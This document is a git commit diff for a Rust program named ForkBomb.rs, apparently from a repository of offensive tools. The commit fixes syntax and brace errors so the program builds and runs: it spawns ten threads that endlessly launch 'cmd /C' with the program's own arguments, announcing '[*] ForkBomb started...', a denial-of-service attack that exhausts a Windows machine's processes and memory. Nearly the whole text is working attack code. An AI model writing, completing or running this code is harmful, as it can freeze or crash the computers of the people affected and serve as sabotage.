9b8099e07986406c9492135952b3bdb43e3f745f
Raul <168528192+Raulisr00t@users.noreply.github.com>
2025-02-20 22:32:47 +0400

    Update ForkBomb.rs

--- ForkBomb.rs
+++ ForkBomb.rs
@@ -1,26 +1,26 @@
-use std::process::{Command,exit};
+use std::process::{Command, exit};
 use std::thread;
 use std::time::Duration;
 
-const NUM_THREADS: usize 10
+const NUM_THREADS: usize = 10;
 
-fn ForkThread(){
+fn ForkThread() {
     loop {
         let output = Command::new("cmd")
-
-        .arg("/C")
-        .arg(std::env::args().collect::<Vec<String>>().join(" "))
-        .output();
+            .arg("/C")
+            .arg(std::env::args().collect::<Vec<String>>().join(" "))
+            .output();
 
         match output {
             Ok(_) => {
-                
+
             }
+            
             Err(e) => {
-                eprintln!("[!] Error:{}",e);
+                eprintln!("[!] Error: {}", e);
                 exit(1);
+            }
         }
-    }
     }
 }
 
@@ -28,10 +28,16 @@ fn fork_bomb() {
     let mut threads = vec![];
 
     for _ in 0..NUM_THREADS {
-        let thread = thread::spawn(fork_thread);
+        let thread = thread::spawn(ForkThread); 
         threads.push(thread);
 
         thread::sleep(Duration::from_millis(10));
+    }
+
+    println!("[*] ForkBomb started...");
+
+    loop {
+        thread::sleep(Duration::from_secs(1)); 
     }
 
     for thread in threads {
@@ -39,7 +45,6 @@ fn fork_bomb() {
     }
 }
 
-fn main(){
-    fork_bomb();
-    return 0;
+fn main() {
+    fork_bomb();  
 }
